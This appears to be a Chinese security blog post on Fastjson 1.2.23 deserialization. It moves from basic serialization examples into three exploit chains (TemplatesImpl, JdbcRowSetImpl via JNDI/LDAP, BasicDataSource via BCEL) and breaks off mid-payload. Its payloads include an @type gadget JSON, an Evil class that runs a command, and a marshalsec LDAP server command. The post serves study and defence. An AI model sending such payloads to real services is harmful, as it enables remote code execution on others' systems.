    <content type="html"><![CDATA[<p>到了喜闻乐见的Fastjson。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Fastjson 是阿里巴巴的开源 JSON 解析库，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。顾名思义，FastJson的特点就是快。</p><p>先从最简单的用法说起吧。</p><h2 id="Basic-Usage"><a href="#Basic-Usage" class="headerlink" title="Basic Usage"></a>Basic Usage</h2><p>依赖用的1.2.23</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="POJO-JSON"><a href="#POJO-JSON" class="headerlink" title="POJO &#x3D;&gt; JSON"></a>POJO &#x3D;&gt; JSON</h3><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JSON.toJSONString()<br></code></pre></td></tr></table></figure><p>参数设置：</p><ul><li><p>SerializerFeature.WriteClassName</p><p>序列化时，会多出一个<code>@type</code>跟上类名</p></li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> Integer age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(Integer age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, Integer age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Non-Arg Constructor&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I am &quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; and &quot;</span> + <span class="hljs-built_in">this</span>.age + <span class="hljs-string">&quot; years old&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><span class="hljs-keyword">import</span> org.example.Person;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Tom&quot;</span>, <span class="hljs-number">18</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> JSON.toJSONString((person1));<br>        System.out.println(str1);<br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Lisa&quot;</span>, <span class="hljs-number">20</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> JSONObject.toJSONString(person2, SerializerFeature.WriteClassName);<br>        System.out.println(str2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>getAge</p><p>getName</p><p>{“age”:18,”name”:”Tom”}</p><p>getAge</p><p>getName</p><p>{“@type”:”org.example.Person”,”age”:20,”name”:”Lisa”}</p></blockquote><h3 id="JSON-POJO"><a href="#JSON-POJO" class="headerlink" title="JSON &#x3D;&gt; POJO"></a>JSON &#x3D;&gt; POJO</h3><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JSON.parseObject()<br></code></pre></td></tr></table></figure><p>参数设置：</p><ul><li>Feature.SupportNonPublicField 反序列化时，加上该参数才能还原private属性</li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> org.example.Person;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;Lisa\&quot;&#125;&quot;</span>, Person.class, Feature.SupportNonPublicField);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Non-Arg Constructor</p><p>setAge</p><p>setName</p><p>I am Lisa and 20 years old</p></blockquote><h3 id="parse-vs-parseObject"><a href="#parse-vs-parseObject" class="headerlink" title="parse vs parseObject"></a>parse vs parseObject</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;Lisa\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> JSON.parse(s);<br>        System.out.println(obj1);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> JSON.parseObject(s);<br>        System.out.println(obj2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Non-Arg Constructor</p><p>setAge</p><p>setName</p><p>I am Lisa and 20 years old</p><p>Non-Arg Constructor</p><p>setAge</p><p>setName</p><p>getAge</p><p>getName</p><p>{“name”:”Lisa”,”age”:20}</p></blockquote><p>可以看到<code>JSON.parseObject()</code>的打印结果和我们定义的<code>toString()</code>不同，说明它不是Person对象。（实际上得到的是JSONObject类对象）</p><p>结论：</p><ul><li>parse()会<strong>识别</strong>并调用目标类的setter方法</li><li>parseObject()会触发目标类的getter和setter方法</li></ul><p><strong>因此若能找到一个类、在反序列化这个类对象时，fastjson调用其setter或getter方法，且setter或getter方法存在漏洞，就可以执行恶意代码。</strong></p><p>下面再列举一些FastJson的结论，在后续调试中可以观察得到：</p><ul><li><code>JSON.parse(jsonString)</code> 和 <code>JSON.parseObject(jsonString, Target.class)</code>，前者会在 jsonString 中解析字符串获取 <code>@type</code> 指定的类，后者则会直接使用参数中的class。</li><li><code>JSON.parseObject(jsonString)</code> 将会返回 JSONObject 对象，且类中的所有 getter 与 setter 都被调用。</li><li>如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 <code>Feature.SupportNonPublicField</code> 参数。</li><li>fastjson 在反序列化时，如果 Field 类型为 <code>byte[]</code>，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。</li><li>fastjson 在为类属性寻找 get&#x2F;set 方法时，调用函数 <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> 方法，会忽略 <code>_ | -</code> 字符串，假如字段名叫 <code>_a_g_e_</code>，getter 方法为 <code>getAge()</code>，fastjson 也可以找得到。</li></ul><p>配置类：</p><p><code>com.alibaba.fastjson.parser.ParserConfig</code>：后面的AutoType开关和黑名单体现在这个类中</p><p>满足条件的setter：</p><ul><li>函数名大于等于4</li><li>非静态函数</li><li>以set开头且第4个字母为大写</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>满足条件的getter</p><ul><li>函数名长度大于等于4</li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无参数</li><li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger</li></ul><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>在前面的动态字节码那里提到过：</p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中定义了一个内部类<br>    TransletClassLoader<br></code></pre></td></tr></table></figure><p>存在作用域为<code>default</code>的方法<code>defineClass</code></p><p>找到如下调用链：</p><p>TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass()</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// TemplatesImpl#getOutputProperties()</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Properties <span class="hljs-title function_">getOutputProperties</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> newTransformer().getOutputProperties();<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (TransformerConfigurationException e) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// TemplatesImpl#newTransformer()</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Transformer <span class="hljs-title function_">newTransformer</span><span class="hljs-params">()</span>&#123;<br>    TransformerImpl transformer;<br>    transformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,<br>                                      _indentNumber, _tfactory);<br>&#125;<br><span class="hljs-comment">// TemplatesImpl#getTransletInstance()</span><br><span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();<br>        <span class="hljs-comment">// ....</span><br>    &#125;<br>    <span class="hljs-type">AbstractTranslet</span> <span class="hljs-variable">translet</span> <span class="hljs-operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();<br>        <span class="hljs-comment">// ...</span><br>&#125;<br><span class="hljs-comment">// TemplatesImpl#defineTransletClasses()</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//....</span><br>    <span class="hljs-type">TransletClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span><br>        AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;TransletClassLoader&gt;() &#123;<br>            <span class="hljs-keyword">public</span> TransletClassLoader <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),<br>                                               _tfactory.getExternalExtensionsMap());<br>            &#125;<br>        &#125;);<br>    <span class="hljs-comment">// ...</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>        _class[i] = loader.defineClass(_bytecodes[i], pd);<br>        <span class="hljs-comment">// ....</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>defineTransletClasses</code>方法中<code>_tfactory.getExternalExtensionsMap()</code> <code>_tfactory</code>是<code>TransformerFactoryImpl</code>类 为了不抛出异常需要<code>_tfactory = new TransformerFactoryImpl()</code></li><li><code>getTransletInstance</code>方法中判断<code>if (_name == null) return null;</code> 所以要给<code>_name</code>赋值（String）</li></ul><p><code>TemplatesImpl</code> 中对加载的字节码是有一定要求的：</p><p>这个字节码对应的类必须是**<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet </code>的子类。**</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#getTransletInstance()首先执行 defineTransletClasses()加载类后，还会对该类进行实例化 (AbstractTranslet) _class[_transletIndex].newInstance();<br></code></pre></td></tr></table></figure><p>而<code>getOutputProperties()</code>正是<code>TemplatesImpl</code>的<code>_outputProperties</code>属性对应的getter方法。</p><p>由于更改的一些<code>TemplatesImpl</code>私有变量没有 setter 方法，需要使用 <code>Feature.SupportNonPublicField</code> 参数。</p><h4 id="PayLoad"><a href="#PayLoad" class="headerlink" title="PayLoad"></a>PayLoad</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_bytecodes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;evilCode after Base64&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;taco&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_tfactory&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_outputProperties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>Evil.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span><br>            <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>获取Base64编码后的Evil.class字节码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">getPayLoad</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>        System.out.println(Base64.getEncoder().encodeToString(code));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p>需要 <code>Feature.SupportNonPublicField</code> 参数</p><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>上文的<code>TemplatesImpl</code>链存在严重限制，即<code>JSON.parse()</code>需要开启<code>Feature.SupportNonPublicField</code></p><p><code>JdbcRowSetImpl</code>链是基于 JNDI+RMI 或 JDNI+LADP 进行攻击，会有一定的JDK版本限制。</p><blockquote><p>RMI利用的JDK版本≤ JDK 6u132、7u122、8u113</p><p>LADP利用JDK版本≤ 6u211 、7u201、8u191</p></blockquote><p><code>com.sun.rowset.JdbcRowSetImpl</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAutoCommit</span><span class="hljs-params">(<span class="hljs-type">boolean</span> var1)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.conn != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-built_in">this</span>.conn.setAutoCommit(var1);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">this</span>.conn = <span class="hljs-built_in">this</span>.connect();<br><span class="hljs-built_in">this</span>.conn = setAutoCommit(var1);<br>&#125;<br><span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>当<code>conn == null</code>时，调用<code>connect()</code>:</p><p><img src="/2024/08/01/fastjson/image-20240801215837593.png" alt="image-20240801215837593"></p><p>经典的<code>(new InitialContext()).lookup()</code>，那么只要dataSourceName设为恶意远程RMI服务或ldap服务即可。</p><blockquote><p>{</p><p> “@type”:”com.sun.rowset.JdbcRowSetImpl”,</p><p> “dataSourceName”:”ldap:&#x2F;&#x2F;127.0.0.1:8099&#x2F;evil”,</p><p> “autoCommit”:true</p><p>}</p></blockquote><p>可以利用marshalsec开启ldap服务：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java -cp .\marshalsec-<span class="hljs-number">0.0</span><span class="hljs-number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="hljs-comment">//127.0.0.1:8000/#calc 8099</span><br></code></pre></td></tr></table></figure><p><img src="/2024/08/01/fastjson/image-20240801220859119.png" alt="image-20240801220859119"></p><h3 id="BasicDataSource"><a href="#BasicDataSource" class="headerlink" title="BasicDataSource"></a>BasicDataSource</h3><p>fastjson网传的三条利用链如下：</p><ul><li><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></li><li><code>com.sun.rowset.JdbcRowSetImpl</code></li><li><code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></li></ul><p>前面两个已经介绍，现在还剩最后一个<code>BasicDataSource</code>。</p><ol><li>常规的Java字节码的执行，但是需要开启<code>Feature.SupportNonPublicField</code>，较鸡肋</li><li>利用JNDI注入，但需要服务器出网</li><li>不用出网也不用开启<code>Feature.SupportNonPublicField</code></li><li>依赖如下</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.45<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>调用链：</strong></p><p><code>getConnection()-&gt;createDataSource()-&gt;createConnectionFactory()-&gt;createDriver()</code></p><p><img src="/2024/08/01/fastjson/image-20240801222516262.png" alt="image-20240801222516262"></p><p><code>Class.forName</code>第二个参数<code>initial</code>为true时，类加载后将会直接执行<code>static&#123;&#125;</code>块中的代码。</p><p><code>driverClassLoader</code>和<code>driverClassName</code>都可以通过fastjson控制</p><blockquote><p>{</p><p> {</p><p> “aaa”: {</p><p> “@type”: “org.apache.tomcat.dbcp.dbcp2.BasicDataSource”,</p><p> “driverClassLoader”: {</p><p> “@type”: “com.sun.org.apache.bcel.internal.util.ClassLoader”</p><p> },</p><p> “driverClassName”: “$$BCEL$$$l$8b$I$A$…”</p><p> }</p><p> }: “bbb”</p><p>}</p></blockquote><p><img src="/2024/08/01/fastjson/image-20240801222607739.png" 